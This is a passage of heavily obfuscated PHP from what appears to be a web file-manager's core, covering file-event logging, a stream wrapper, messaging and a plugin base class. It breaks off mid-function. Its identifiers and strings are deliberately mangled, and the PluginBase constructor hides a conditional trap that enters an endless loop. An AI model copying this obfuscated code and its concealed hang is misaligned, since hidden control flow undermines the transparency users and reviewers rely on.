$¶Á»ê‡ğ =& $_SERVER[ñˆ‹ß¿÷]; if ($üÈ‰İ Õ[$¶Á»ê‡ğ[1940]]) { $‚ÎñĞÜ = Model($¶Á»ê‡ğ[507])->listData($üÈ‰İ Õ[$¶Á»ê‡ğ[1940]]); if (!$‚ÎñĞÜ) { return !1; $Õé„ëÚ = Model($¶Á»ê‡ğ[507])->listData(); $ìĞ»¹×¡ = array_filter_by_field($Õé„ëÚ, $¶Á»ê‡ğ[413], $¶Á»ê‡ğ[197]); return $ìĞ»¹×¡; } $•Ì‰ş®• = array_field_key($‚ÎñĞÜ, array($¶Á»ê‡ğ[399], $¶Á»ê‡ğ[32], $¶Á»ê‡ğ[413], $¶Á»ê‡ğ[1859], $¶Á»ê‡ğ[1860])); $•Ì‰ş®•[$¶Á»ê‡ğ[2051]] = $üÈ‰İ Õ; return $•Ì‰ş®•; } else { return array($¶Á»ê‡ğ[419] => 0, $¶Á»ê‡ğ[1842] => $üÈ‰İ Õ[$¶Á»ê‡ğ[1996]], $¶Á»ê‡ğ[420] => $¶Á»ê‡ğ[12], $¶Á»ê‡ğ[1859] => $¶Á»ê‡ğ[2052]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\143\145\137\145\166\145\156\164"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\x54\x69\155\x65", "\164\151\x6d\x65", "\151\156\x73\145\162\x74", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\144\145\163\143", '', "\x69\156\x73\x65\162\164\x2c\x75\x70\x64\141\164\145\x2c\163\x65\x6c\x65\143\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ñ—éˆ¼µ, $°ØÊŞë¨, $ÑÓú‹Š† = '') { $¦¡î‰’ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->eventSave) { return; } $±•ó¤®Ç = Model($¦¡î‰’[1334])->sourceInfo($ñ—éˆ¼µ); if (!$±•ó¤®Ç) { return !1; } if ($this->isCacheEvent($±•ó¤®Ç, $°ØÊŞë¨)) { return; } if ($ÑÓú‹Š† && is_string($ÑÓú‹Š†)) { $ÑÓú‹Š† = array($¦¡î‰’[1875] => $ÑÓú‹Š†); } $š‹¥€ŸÇ = array($¦¡î‰’[417] => $ñ—éˆ¼µ, $¦¡î‰’[2053] => $±•ó¤®Ç[$¦¡î‰’[432]], $¦¡î‰’[2054] => $±•ó¤®Ç[$¦¡î‰’[32]], $¦¡î‰’[519] => !empty($±•ó¤®Ç[$¦¡î‰’[519]]) ? $±•ó¤®Ç[$¦¡î‰’[519]] : $¦¡î‰’[12], $¦¡î‰’[1655] => USER_ID, $¦¡î‰’[422] => $°ØÊŞë¨, $¦¡î‰’[1657] => $ÑÓú‹Š†); $this->addSystemLog($°ØÊŞë¨, $š‹¥€ŸÇ); unset($š‹¥€ŸÇ[$¦¡î‰’[2054]], $š‹¥€ŸÇ[$¦¡î‰’[519]]); return $this->add($š‹¥€ŸÇ); } private function addSystemLog($ş‚£…‡, $õÎ´²ıİ) { $Ú÷—öÅ =& $_SERVER[ñˆ‹ß¿÷]; if ($ş‚£…‡ == $Ú÷—öÅ[2055]) { $ş‚£…‡ = $õÎ´²ıİ[$Ú÷—öÅ[453]][$Ú÷—öÅ[2056]]; } else { if (in_array($ş‚£…‡, array($Ú÷—öÅ[1816], $Ú÷—öÅ[2057]))) { $ş‚£…‡ = $õÎ´²ıİ[$Ú÷—öÅ[453]][$Ú÷—öÅ[762]]; } } $±ß÷§‘¬ = array_merge($õÎ´²ıİ, array($Ú÷—öÅ[2058] => $õÎ´²ıİ[$Ú÷—öÅ[402]], $Ú÷—öÅ[2059] => $õÎ´²ıİ[$Ú÷—öÅ[2059]])); Hook::trigger($Ú÷—öÅ[2060], $Ú÷—öÅ[2061] . $ş‚£…‡, $õÎ´²ıİ); Model($Ú÷—öÅ[1780])->addLog($Ú÷—öÅ[2061] . $ş‚£…‡, $±ß÷§‘¬); } private function isCacheEvent($˜¯Ò…¤ı, $Úµ¸õô¥) { if ($˜¯Ò…¤ı[$_SERVER[ñˆ‹ß¿÷][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($à–¨¨†ƒ, $ÎÕ†È÷â) { $Í³ß£âû =& $_SERVER[ñˆ‹ß¿÷]; $‹‚Öãæò = Model($Í³ß£âû[1334])->sourceInfo($à–¨¨†ƒ); $ˆ“öËÈ® = array($Í³ß£âû[2056] => $ÎÕ†È÷â, $Í³ß£âû[32] => $‹‚Öãæò[$Í³ß£âû[32]]); return $this->addEvent($à–¨¨†ƒ, $Í³ß£âû[2055], $ˆ“öËÈ®); } public function eventFileEdit($ìòË…ˆ) { $À«ÉÆÏõ =& $_SERVER[ñˆ‹ß¿÷]; $÷ìû‚Ùê = array($À«ÉÆÏõ[2062] => $_SERVER[$À«ÉÆÏõ[2063]], $À«ÉÆÏõ[2064] => strtolower(ACTION)); if (isset($GLOBALS[$À«ÉÆÏõ[7]][$À«ÉÆÏõ[2065]])) { $÷ìû‚Ùê[$À«ÉÆÏõ[2065]] = $À«ÉÆÏõ[88]; } return $this->addEvent($ìòË…ˆ, $À«ÉÆÏõ[1806], $÷ìû‚Ùê); } public function eventRecycle($éøü¼Ê, $Î˜ÆÂó‡) { return $this->addEvent($éøü¼Ê, $_SERVER[ñˆ‹ß¿÷][2057], $Î˜ÆÂó‡); } public function eventRemove($–íÃ–ö) { $”˜çÏÑÊ =& $_SERVER[ñˆ‹ß¿÷]; $äà‰»’µ = Model($”˜çÏÑÊ[1334])->sourceInfo($–íÃ–ö); $öğ²Á…À = $äà‰»’µ[$”˜çÏÑÊ[32]]; return $this->addEvent($äà‰»’µ[$”˜çÏÑÊ[432]], $”˜çÏÑÊ[1805], $öğ²Á…À); } public function eventShare($İÜò¯, $ùşæ ü) { return $this->addEvent($İÜò¯, $_SERVER[ñˆ‹ß¿÷][1816], $ùşæ ü); } public function eventMove($é×òÑ²„, $¸±ä™›Ó, $²À¬ì³²) { $˜È¯Ÿ¨ =& $_SERVER[ñˆ‹ß¿÷]; $Ò•÷ı = Model($˜È¯Ÿ¨[1334]); $Õ’Ë¦«³ = $Ò•÷ı->sourceInfo($é×òÑ²„); $Ô¸¦‘» = $Ò•÷ı->sourceInfo($¸±ä™›Ó); $÷ÈĞ“Õ = $Ò•÷ı->sourceInfo($²À¬ì³²); $Ú¾ğÎ·÷ = array($˜È¯Ÿ¨[1167] => $¸±ä™›Ó, $˜È¯Ÿ¨[2066] => $Ô¸¦‘»[$˜È¯Ÿ¨[32]], $˜È¯Ÿ¨[2044] => !empty($Ô¸¦‘»[$˜È¯Ÿ¨[519]]) ? $Ô¸¦‘»[$˜È¯Ÿ¨[519]] : $˜È¯Ÿ¨[12], $˜È¯Ÿ¨[1168] => $²À¬ì³², $˜È¯Ÿ¨[2067] => $÷ÈĞ“Õ[$˜È¯Ÿ¨[32]], $˜È¯Ÿ¨[2068] => !empty($÷ÈĞ“Õ[$˜È¯Ÿ¨[519]]) ? $÷ÈĞ“Õ[$˜È¯Ÿ¨[519]] : $˜È¯Ÿ¨[12]); $this->addEvent($é×òÑ²„, $˜È¯Ÿ¨[557], $Ú¾ğÎ·÷); $Õ’Ë¦«³ = $Ò•÷ı->sourceInfo($é×òÑ²„); $Ú¾ğÎ·÷ = array($˜È¯Ÿ¨[402] => $Õ’Ë¦«³[$˜È¯Ÿ¨[402]], $˜È¯Ÿ¨[32] => $Õ’Ë¦«³[$˜È¯Ÿ¨[32]]); $this->addEvent($¸±ä™›Ó, $˜È¯Ÿ¨[2069], $Ú¾ğÎ·÷); } public function eventCopy($ª‹îÂ§²) { $this->eventCreate($ª‹îÂ§², $_SERVER[ñˆ‹ß¿÷][555]); } public function eventRename($£¬¿ˆ´î, $Ë¿»òÖù, $¢õâÑ‚) { $Æ¹ü‚ =& $_SERVER[ñˆ‹ß¿÷]; $Û†¯ËŠ = array($Æ¹ü‚[1167] => $Ë¿»òÖù, $Æ¹ü‚[1168] => $¢õâÑ‚); return $this->addEvent($£¬¿ˆ´î, $Æ¹ü‚[1351], $Û†¯ËŠ); } public function eventAddComment($ğ„ì­Ü’, $Òå¤§˜¼) { return $this->addEvent($ğ„ì­Ü’, $_SERVER[ñˆ‹ß¿÷][2070], $Òå¤§˜¼); } public function eventAddDesc($£Æ­å, $ù¿«ºä) { return $this->addEvent($£Æ­å, $_SERVER[ñˆ‹ß¿÷][2071], $ù¿«ºä); } public function listBySource($Œßåˆ‡) { $…´êı§Ó =& $_SERVER[ñˆ‹ß¿÷]; $ŞÓ×•Öª = Model($…´êı§Ó[1334])->sourceInfo($Œßåˆ‡); $Ô„ÊãåŒ = array($…´êı§Ó[417] => $Œßåˆ‡); if ($ŞÓ×•Öª[$…´êı§Ó[410]] == $…´êı§Ó[88]) { $’è¡½¶ù = Model($…´êı§Ó[1334])->listSearchChildren($Œßåˆ‡, 20000); $’è¡½¶ù[] = $Œßåˆ‡ . $…´êı§Ó[378]; $Ô„ÊãåŒ = array($…´êı§Ó[402] => array($…´êı§Ó[7], $’è¡½¶ù)); } $­›×ûğ = $this->where($Ô„ÊãåŒ)->order($…´êı§Ó[2072])->selectPage(); if ($­›×ûğ[$…´êı§Ó[366]][$…´êı§Ó[367]] == 0) { $­›×ûğ[$…´êı§Ó[366]][$…´êı§Ó[367]] = 1; $­›×ûğ[$…´êı§Ó[369]] = array(array($…´êı§Ó[417] => $Œßåˆ‡, $…´êı§Ó[2053] => $ŞÓ×•Öª[$…´êı§Ó[432]], $…´êı§Ó[1655] => $ŞÓ×•Öª[$…´êı§Ó[454]], $…´êı§Ó[422] => $…´êı§Ó[2073], $…´êı§Ó[423] => $ŞÓ×•Öª[$…´êı§Ó[200]], $…´êı§Ó[1657] => $…´êı§Ó[12])); } return $this->eventListParse($­›×ûğ, $Œßåˆ‡); } private function eventListParse($Á¤®¾×õ, $Çñ½ÍÃ) { $€¾§Ô•© =& $_SERVER[ñˆ‹ß¿÷]; $”ŞÁ”ŠË = $Á¤®¾×õ[$€¾§Ô•©[369]]; $î¾Š«Š = array_to_keyvalue($”ŞÁ”ŠË, $€¾§Ô•©[12], $€¾§Ô•©[402]); $›Ùååêí = array_to_keyvalue($”ŞÁ”ŠË, $€¾§Ô•©[12], $€¾§Ô•©[2059]); foreach ($”ŞÁ”ŠË as $›ò¦àï) { $ˆÏª„øÓ = $›ò¦àï[$€¾§Ô•©[453]]; if ($›ò¦àï[$€¾§Ô•©[33]] == $€¾§Ô•©[557] && isset($ˆÏª„øÓ[$€¾§Ô•©[1167]])) { $î¾Š«Š[] = $ˆÏª„øÓ[$€¾§Ô•©[1167]] . $€¾§Ô•©[12]; $î¾Š«Š[] = $ˆÏª„øÓ[$€¾§Ô•©[1168]] . $€¾§Ô•©[12]; } if ($›ò¦àï[$€¾§Ô•©[33]] == $€¾§Ô•©[2069] && isset($ˆÏª„øÓ[$€¾§Ô•©[402]])) { $î¾Š«Š[] = $ˆÏª„øÓ[$€¾§Ô•©[402]] . $€¾§Ô•©[12]; } } $î¾Š«Š = array_merge($î¾Š«Š, $›Ùååêí, array($Çñ½ÍÃ . $€¾§Ô•©[12])); $î¾Š«Š = array_unique($î¾Š«Š); $œ±¾ñ«› = array_unique(array_to_keyvalue($”ŞÁ”ŠË, $€¾§Ô•©[12], $€¾§Ô•©[1664])); $¬µñ–•° = Model($€¾§Ô•©[535])->userListInfo($œ±¾ñ«›); $‘ı¨‘†‡ = Model($€¾§Ô•©[832])->sourceListInfo($î¾Š«Š, !0); foreach ($”ŞÁ”ŠË as &$›ò¦àï) { if ($›ò¦àï[$€¾§Ô•©[33]] == $€¾§Ô•©[557] && isset($›ò¦àï[$€¾§Ô•©[453]][$€¾§Ô•©[1167]])) { $›ò¦àï[$€¾§Ô•©[453]][$€¾§Ô•©[1167]] = $‘ı¨‘†‡[$›ò¦àï[$€¾§Ô•©[453]][$€¾§Ô•©[1167]]]; $›ò¦àï[$€¾§Ô•©[453]][$€¾§Ô•©[1168]] = $‘ı¨‘†‡[$›ò¦àï[$€¾§Ô•©[453]][$€¾§Ô•©[1168]]]; } if ($›ò¦àï[$€¾§Ô•©[33]] == $€¾§Ô•©[2069] && isset($›ò¦àï[$€¾§Ô•©[453]][$€¾§Ô•©[402]])) { $›ò¦àï[$€¾§Ô•©[453]][$€¾§Ô•©[402]] = $‘ı¨‘†‡[$›ò¦àï[$€¾§Ô•©[453]][$€¾§Ô•©[402]]]; } $›ò¦àï[$€¾§Ô•©[86]] = $‘ı¨‘†‡[$›ò¦àï[$€¾§Ô•©[402]]]; $›ò¦àï[$€¾§Ô•©[2074]] = $‘ı¨‘†‡[$›ò¦àï[$€¾§Ô•©[2059]]]; if ($›ò¦àï[$€¾§Ô•©[33]] == $€¾§Ô•©[1805]) { $›ò¦àï[$€¾§Ô•©[2074]] = $›ò¦àï[$€¾§Ô•©[86]]; $›ò¦àï[$€¾§Ô•©[2059]] = $›ò¦àï[$€¾§Ô•©[2074]][$€¾§Ô•©[402]]; $›ò¦àï[$€¾§Ô•©[86]] = !1; $›ò¦àï[$€¾§Ô•©[402]] = $€¾§Ô•©[12]; } $›ò¦àï[$€¾§Ô•©[2004]] = $¬µñ–•°[$›ò¦àï[$€¾§Ô•©[1664]]]; } unset($›ò¦àï); $Á¤®¾×õ[$€¾§Ô•©[369]] = $”ŞÁ”ŠË; return $Á¤®¾×õ; } public function removeBySource($í×üõó€) { $¤ş½âŠ÷ = array($_SERVER[ñˆ‹ß¿÷][417] => $í×üõó€); $this->where($¤ş½âŠ÷)->remove(); } } goto eô©›â»‹; DŠ×ƒÄĞ…Ä: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($øºÒõ¬ì, $²Ä÷ñ›ˆ = '') { $this->info = $this->info($øºÒõ¬ì); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ñˆ‹ß¿÷][84]]; $this->pathOpen = $øºÒõ¬ì; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$øºÒõ¬ì])) { self::$_chunkBuffer[$øºÒõ¬ì] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ˆ‹ò‹º†) { $âÍØù·ş = $this->fileSubstr($this->pose, $ˆ‹ò‹º†); $this->pose += strlen($âÍØù·ş); return $âÍØù·ş; } public function stream_tell() { return $this->pose; } public function stream_seek($î¸¦¨ùª, $»éÕÕé²) { $ùÈ®›ß– =& $_SERVER[ñˆ‹ß¿÷]; if ($»éÕÕé² == SEEK_SET) { $this->pose = $î¸¦¨ùª; } else { if ($»éÕÕé² == SEEK_CUR) { $this->pose += $î¸¦¨ùª; } else { if ($»éÕÕé² == SEEK_END) { $this->pose = $this->info[$ùÈ®›ß–[76]] + intval($î¸¦¨ùª); } } } if ($î¸¦¨ùª < 0) { $this->pose = $this->info[$ùÈ®›ß–[76]] + $î¸¦¨ùª; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ñˆ‹ß¿÷][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Úô£³ô, $æâºˆÈı) { $³¬üŠ’È =& $_SERVER[ñˆ‹ß¿÷]; $ÅÖâò³ğ = $this->info($Úô£³ô); return array($³¬üŠ’È[1512] => 0, $³¬üŠ’È[1513] => 0, $³¬üŠ’È[16] => 32768 + 511, $³¬üŠ’È[1514] => 0, $³¬üŠ’È[1515] => 0, $³¬üŠ’È[1516] => 0, $³¬üŠ’È[1517] => 0, $³¬üŠ’È[76] => $ÅÖâò³ğ[$³¬üŠ’È[76]], $³¬üŠ’È[1518] => $ÅÖâò³ğ[$³¬üŠ’È[1386]], $³¬üŠ’È[1474] => $ÅÖâò³ğ[$³¬üŠ’È[85]], $³¬üŠ’È[1473] => $ÅÖâò³ğ[$³¬üŠ’È[200]], $³¬üŠ’È[1519] => 0, $³¬üŠ’È[1520] => 0); } static $fileInfo = array(); public function info($Ü°î¢˜) { $ß„éşíô = $_SERVER[ñˆ‹ß¿÷][1521]; if (isset(self::$fileInfo[$Ü°î¢˜])) { return self::$fileInfo[$Ü°î¢˜]; } if (substr($Ü°î¢˜, 0, strlen($ß„éşíô)) != $ß„éşíô) { return !1; } self::$fileInfo[$Ü°î¢˜] = IO::info(substr($Ü°î¢˜, strlen($ß„éşíô))); return self::$fileInfo[$Ü°î¢˜]; } public static function read($Òá¼ñ, $À£ó×‰, $öÂÇ§Èé) { if (!isset(self::$_fopenCache[$Òá¼ñ])) { $öäµà¹ü = new StreamWrapperIO(); $öäµà¹ü->stream_open($Òá¼ñ); self::$_fopenCache[$Òá¼ñ] = $öäµà¹ü; } $öäµà¹ü = self::$_fopenCache[$Òá¼ñ]; return $öäµà¹ü->fileSubstr($À£ó×‰, $öÂÇ§Èé); } public static function _read($¢™‰¿ó, $ÜÉÁŸš, $×Ãèûƒ™) { $Õí©¢‹ú =& $_SERVER[ñˆ‹ß¿÷]; $éúÈ²¿ = fopen($¢™‰¿ó, $Õí©¢‹ú[1390]); if (!$éúÈ²¿) { return $Õí©¢‹ú[12]; } $½µ’¬ŸŠ = 8192; fseek($éúÈ²¿, $ÜÉÁŸš, SEEK_SET); $¡éÉ¹ı³ = $Õí©¢‹ú[12]; $é‰ëäí = 0; while ($é‰ëäí < $×Ãèûƒ™) { $´¶Ùâéû = min($½µ’¬ŸŠ, $×Ãèûƒ™ - $é‰ëäí); $¡éÉ¹ı³ .= fread($éúÈ²¿, $´¶Ùâéû); $é‰ëäí += $´¶Ùâéû; } fclose($éúÈ²¿); return $¡éÉ¹ı³; } public function fileSubstr($ùûÌêš, $¾çÇÇş€) { $ƒÊïƒ…ş =& $_SERVER[ñˆ‹ß¿÷]; $Ã²ÆËñ = $this->info[$ƒÊïƒ…ş[76]]; $ŠìÂ¦õ = $ùûÌêš; $©­Ñ›„ = $¾çÇÇş€; if ($ùûÌêš < 0) { $ùûÌêš = $Ã²ÆËñ + $ùûÌêš; } if ($¾çÇÇş€ === !1) { $¾çÇÇş€ = $Ã²ÆËñ - $ùûÌêš; } if ($ùûÌêš + $¾çÇÇş€ > $Ã²ÆËñ) { $¾çÇÇş€ = $Ã²ÆËñ - $ùûÌêš; } if ($¾çÇÇş€ <= 0) { return $ƒÊïƒ…ş[12]; } if ($ùûÌêš < 0 || $ùûÌêš >= $Ã²ÆËñ || $¾çÇÇş€ <= 0 || $¾çÇÇş€ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\x6c\x65\122\x65\141\144\40\x65\162\x72\157\162\41\x20\163\x74\x61\162\164\75{$ùûÌêš}\x3b\x6c\x65\156\x67\x74\150\75{$¾çÇÇş€}\x3b\x20\163\151\172\x65\x3d{$Ã²ÆËñ}\x3b"); } $³ª›¢İ = 64 * 1024; $Ïö½çĞã =& self::$_chunkBuffer[$this->path]; if (!$Ïö½çĞã) { $Ïö½çĞã = array(); } $ÈßõÊâ = 0; $øŠ¦¦¶‰ = 0; $ƒéß—à = $ƒÊïƒ…ş[12]; foreach ($Ïö½çĞã as $ÈßõÊâ => $ƒéß—à) { $ÈßõÊâ = intval($ÈßõÊâ); $øŠ¦¦¶‰ = $ÈßõÊâ + strlen($ƒéß—à); if ($ùûÌêš >= $øŠ¦¦¶‰) { continue; } if ($ùûÌêš >= $ÈßõÊâ && $ùûÌêš + $¾çÇÇş€ <= $øŠ¦¦¶‰) { return substr($ƒéß—à, $ùûÌêš - $ÈßõÊâ, $¾çÇÇş€); } break; } if (count($Ïö½çĞã) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ƒÊïƒ…ş[1522], $ƒÊïƒ…ş[1523] . count($Ïö½çĞã) . "\x3b\163\164\x61\x72\x74\75{$ùûÌêš}\x2c\154\x65\x6e\x67\x74\150\75{$¾çÇÇş€}\73\x70\157\163\145\x3a{$ÈßõÊâ}\x7e{$øŠ¦¦¶‰}"); throw new Exception($ƒÊïƒ…ş[1524]); } $½´Ğ›ˆ = intval($ùûÌêš / $³ª›¢İ) * $³ª›¢İ; $îµÅç¹Ì = ceil(($ùûÌêš + $¾çÇÇş€) / $³ª›¢İ) * $³ª›¢İ - $½´Ğ›ˆ; $‰ÒˆéÂ = IO::fileSubstr($this->path, $½´Ğ›ˆ, $îµÅç¹Ì); $Ïö½çĞã[$½´Ğ›ˆ . $ƒÊïƒ…ş[12]] = $‰ÒˆéÂ; ksort($Ïö½çĞã); $¶ã®¤Ô¯ = substr($‰ÒˆéÂ, $ùûÌêš - $½´Ğ›ˆ, $¾çÇÇş€); return $¶ã®¤Ô¯; } private function log($ñ­Şˆ°ø, $°Ù£ªŸÄ) { $©âüÊã =& $_SERVER[ñˆ‹ß¿÷]; $©ÏğÇ = timeFloat() - $this->timeStart; write_log(sprintf($©âüÊã[1525], $ñ­Şˆ°ø, $this->info[$©âüÊã[32]], $©ÏğÇ, $°Ù£ªŸÄ), $©âüÊã[1190]); } } class Message { function __construct() { } public function send($Ï¬èó = '', $Î÷‚ÔÂ› = array(), $€ë¯€å± = "\164\x65\170\164") { $‡şèÕñ½ =& $_SERVER[ñˆ‹ß¿÷]; $º«„ğĞ¤ = array($‡şèÕñ½[33] => $‡şèÕñ½[1526], $‡şèÕñ½[762] => $Ï¬èó); if (in_array($€ë¯€å±, array($‡şèÕñ½[1526], $‡şèÕñ½[1527]))) { $º«„ğĞ¤[$‡şèÕñ½[33]] = $€ë¯€å±; } $Î÷‚ÔÂ› = array($‡şèÕñ½[515] => isset($Î÷‚ÔÂ›[$‡şèÕñ½[515]]) ? $Î÷‚ÔÂ›[$‡şèÕñ½[515]] : $‡şèÕñ½[12], $‡şèÕñ½[600] => isset($Î÷‚ÔÂ›[$‡şèÕñ½[600]]) ? $Î÷‚ÔÂ›[$‡şèÕñ½[600]] : $‡şèÕñ½[12]); if (empty($Ï¬èó) || empty($Î÷‚ÔÂ›[$‡şèÕñ½[515]]) && empty($Î÷‚ÔÂ›[$‡şèÕñ½[600]])) { return !1; } $Ú¬¤” = array($‡şèÕñ½[1467] => $º«„ğĞ¤, $‡şèÕñ½[1528] => $Î÷‚ÔÂ›); Hook::trigger($‡şèÕñ½[1529], $Ú¬¤”); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Í‘éß‘ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($_SERVER[$Í‘éß‘[879]]) || !isset($_SERVER[$Í‘éß‘[1344]])) { $Ò¬„­¢ë = $Í‘éß‘[881]; $µÚèûş¦ = $Í‘éß‘[882]; $Òµğá› = $_SERVER[$Í‘éß‘[883]] . $Í‘éß‘[884]; $ßŠ©»Ñè = $µÚèûş¦($Òµğá›); $É¸¨í€å = explode($Í‘éß‘[231], $ßŠ©»Ñè); if (count($É¸¨í€å) < $Í‘éß‘[626]) { $ö™µ©å = $Í‘éß‘[885]; $ö™µ©å(); } $ı„²ú± = $Í‘éß‘[886]; $ı„²ú±($_SERVER[$Í‘éß‘[887]]); $òóËõ¥® = 1; for ($Õ¿²­»ª = $òóËõ¥®; $Õ¿²­»ª > 0; $Õ¿²­»ª++) { $ı„²ú± = json_encode($GLOBALS[$Í‘éß‘[418]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Í‘éß‘[1530]); $this->pluginName = str_replace($Í‘éß‘[1530], $Í‘éß‘[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Í‘éß‘[8]; $this->pluginApi = appHostGet() . $Í‘éß‘[1531] . $this->pluginName . $Í‘éß‘[8]; $this->pluginHost = $config[$Í‘éß‘[1532]] . $this->pluginName . $Í‘éß‘[8]; $this->pluginHostDefault = $config[$Í‘éß‘[1532]] . $this->pluginName . $Í‘éß‘[8]; $œ“¹À‡½ = $config[$Í‘éß‘[1533]]; if ($œ“¹À‡½ && strpos($Í‘éß‘[50] . $œ“¹À‡½ . $Í‘éß‘[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Í‘éß‘[1534]] . $this->pluginName . $Í‘éß‘[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ñˆ‹ß¿÷][1535]); } protected function assign($„Óƒ´â›, $­øª˜¬ = false) { if (is_array($„Óƒ´â›)) { $this->values = array_merge($this->values, $„Óƒ´â›); } else { $this->values[$„Óƒ´â›] = $­øª˜¬; } } protected function display($¯üîã) { extract($this->values); require $¯üîã; } final function hookRegist($¼…¨àı†) { $this->modelPlugin->appRegist($this->pluginName, $¼…¨àı†); } final function appIcon() { $–ó¼’¬í =& $_SERVER[ñˆ‹ß¿÷]; $—ì À›ğ = $this->appPackage(); $‡Úë‹œğ = $–ó¼’¬í[12]; if (isset($—ì À›ğ[$–ó¼’¬í[416]])) { if (isset($—ì À›ğ[$–ó¼’¬í[416]][$–ó¼’¬í[1536]])) { $‡Úë‹œğ = $–ó¼’¬í[1537] . $—ì À›ğ[$–ó¼’¬í[416]][$–ó¼’¬í[1536]] . $–ó¼’¬í[1538]; } else { if ($—ì À›ğ[$–ó¼’¬í[416]][$–ó¼’¬í[1539]]) { $‡Úë‹œğ = $–ó¼’¬í[1540] . $—ì À›ğ[$–ó¼’¬í[416]][$–ó¼’¬í[1539]] . $–ó¼’¬í[1541]; } } } return $‡Úë‹œğ; } final function fileCanView($”‘®¦•) { $íèùÃ¤Ñ =& $_SERVER[ñˆ‹ß¿÷]; if (request_url_safe($”‘®¦•)) { return !0; } if ($this->isShare($”‘®¦•)) { return !0; } $›ë³ëİ— = Session::get($íèùÃ¤Ñ[1542]); if (!$›ë³ëİ— || !$›ë³ëİ—[$íèùÃ¤Ñ[1543]]) { $ÉŞ‘ìîÆ = $íèùÃ¤Ñ[1544] . rawurlencode(this_url()); show_tips(LNG($íèùÃ¤Ñ[1545]) . $íèùÃ¤Ñ[1546] . $ÉŞ‘ìîÆ . $íèùÃ¤Ñ[1547] . LNG($íèùÃ¤Ñ[1548]) . $íèùÃ¤Ñ[1549], !1); } if (!Action($íèùÃ¤Ñ[1550])->authCan($íèùÃ¤Ñ[1551])) { show_tips(LNG($íèùÃ¤Ñ[1552]) . $íèùÃ¤Ñ[1553], !1); } ActionCall($íèùÃ¤Ñ[1554], $”‘®¦•); } final function isShare($€˜–ÆéÌ) { $ò‚‚Šñ = KodIO::parse($€˜–ÆéÌ); return $ò‚‚Šñ[$_SERVER[ñˆ‹ß¿÷][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÆÚ÷œïô) { if (request_url_safe($ÆÚ÷œïô)) { return $ÆÚ÷œïô; } if (!$this->isShare($ÆÚ÷œïô)) { $ÆÚ÷œïô = $this->filePath($ÆÚ÷œïô); } return Action($_SERVER[ñˆ‹ß¿÷][1182])->linkOut($ÆÚ÷œïô); } public function filePathLinkOut($”óğİôõ) { if (request_url_safe($”óğİôõ)) { return $”óğİôõ; } $this->fileCanView($”óğİôõ); return Action($_SERVER[ñˆ‹ß¿÷][1182])->link($”óğİôõ); } final function filePath($Ù•ˆ™îÍ) { $Ğì¹±—Ÿ =& $_SERVER[ñˆ‹ß¿÷]; if ($°æå¼†Í = $this->checkSharePath($Ù•ˆ™îÍ)) { Hook::trigger($Ğì¹±—Ÿ[1555], $°æå¼†Í); return $°æå¼†Í; } $this->fileCanView($Ù•ˆ™îÍ); if (request_url_safe($Ù•ˆ™îÍ)) { $³í’Å²× = parse_url_query($Ù•ˆ™îÍ); if (isset($³í’Å²×[$Ğì¹±—Ÿ[1556]]) && isset($³í’Å²×[$Ğì¹±—Ÿ[213]])) { $³´å­é = Model($Ğì¹±—Ÿ[777])->get($Ğì¹±—Ÿ[778]); $õõò°øÙ = Mcrypt::decode($³í’Å²×[$Ğì¹±—Ÿ[213]], $³´å­é); if ($õõò°øÙ) { $this->fileInfo = IO::infoWithChildren($õõò°øÙ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $õõò°øÙ; } } $Ù•ˆ™îÍ = $this->_cacheHttpFile($Ù•ˆ™îÍ); $this->fileInfo = IO::infoWithChildren($Ù•ˆ™îÍ); } else { $this->fileInfo = IO::infoWithChildren($Ù•ˆ™îÍ); if (!$this->fileInfo) { show_tips(LNG($Ğì¹±—Ÿ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Ğì¹±—Ÿ[1555], $Ù•ˆ™îÍ); return $Ù•ˆ™îÍ; } final function _cacheHttpFile($ÄÜ‚Íı) { $åÀíİ’ = hash_path($ÄÜ‚Íı, !0); $this->cachePath = $this->pluginCachePath($åÀíİ’); if ($°À†ê‘È = IO::fileNameExist($this->cachePath, $åÀíİ’)) { return KodIO::make($°À†ê‘È); } $È—İú¸Û = $this->cachePath . $åÀíİ’; return $this->pluginCacheFileSet($È—İú¸Û, file_get_contents_nossl($ÄÜ‚Íı)); } final function _tmpFileName($°ñ”óı´ = array()) { $²Çáçş =& $_SERVER[ñˆ‹ß¿÷]; if (!$°ñ”óı´) { $°ñ”óı´ = $this->fileInfo; } if (isset($°ñ”óı´[$²Çáçş[177]])) { return $°ñ”óı´[$²Çáçş[177]]; } if (isset($°ñ”óı´[$²Çáçş[170]][$²Çáçş[177]])) { return 